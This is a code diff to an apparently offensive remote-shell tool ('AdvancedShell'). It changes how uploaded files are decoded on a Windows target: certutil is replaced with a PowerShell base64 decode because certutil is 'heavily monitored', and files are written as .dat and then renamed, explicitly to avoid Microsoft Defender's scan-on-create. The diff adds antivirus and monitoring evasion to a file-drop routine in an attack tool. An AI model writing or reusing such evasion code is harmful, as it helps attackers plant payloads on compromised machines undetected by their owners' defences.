@@ -1077,7 +1077,19 @@ class AdvancedShell:
                                     sys.stdout.write(f"\r  [{pct:3d}%] Chunk {i+1}/{len(chunks)}");sys.stdout.flush()
                                 print()
                                 if not failed:
-                                    o=self.execute(f'certutil -decode "{tmp}" "{rp_safe}" & del "{tmp}"')
+                                    # Use PowerShell decode instead of certutil (heavily monitored)
+                                    # Write to non-.exe extension first to avoid Defender scan-on-create
+                                    dat_name=rp_safe.rsplit('.',1)[0]+'.dat' if '.' in rp_safe.split('/')[-1] else rp_safe+'.dat'
+                                    o=self.execute(f"powershell -c \"[IO.File]::WriteAllBytes('{dat_name}',[Convert]::FromBase64String((Get-Content '{tmp}' -Raw)))\"")
+                                    # Check if .dat was created
+                                    chk=self.execute(f'if exist "{dat_name}" (echo DAT_OK) else (echo DAT_FAIL)')
+                                    if chk and 'DAT_OK' in chk:
+                                        # Rename .dat to original target name
+                                        o=self.execute(f'move /Y "{dat_name}" "{rp_safe}" >nul 2>&1')
+                                        self.execute(f'del /f "{tmp}" >nul 2>&1')
+                                    else:
+                                        print(f"{Y}[!] Decode to .dat failed — .b64 file kept at {tmp}{W}")
+                                        print(f"{Y}    Manual: powershell [IO.File]::WriteAllBytes('out.dat',[Convert]::FromBase64String((gc '{tmp}' -Raw))){W}")
                         else:
                             if len(chunks)==1:
                                 o=self.execute(f"echo '{b64}'|base64 -d > '{rp_safe}'")
